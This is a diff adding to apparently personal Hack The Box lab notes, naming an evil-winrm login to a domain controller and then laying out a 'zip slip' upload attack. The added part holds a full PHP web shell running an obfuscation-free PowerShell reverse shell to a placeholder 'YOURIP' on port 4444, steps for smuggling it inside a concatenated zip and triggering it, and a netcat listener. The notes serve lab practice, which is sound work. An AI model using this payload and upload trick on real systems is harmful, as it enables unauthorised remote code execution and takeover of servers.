@@ -23,3 +23,22 @@ connecting to evil-winrm with ticket:
 ```
  evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
 ```
+
+***
+zip slip:
+```
+zip benign.zip legit.pdf
+mkdir malicious_files
+cd malicious_files
+nano shell.php
+
+<?php shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\""); ?>
+
+zip -r malicious.zip malicious_files/
+
+cat benign.zip malicious.zip > combined.zip
+
+then upload combined.zip after u go to url change legit.pdf to malicious_files/shell.php 
+nc -nlvp 4444
+```
+
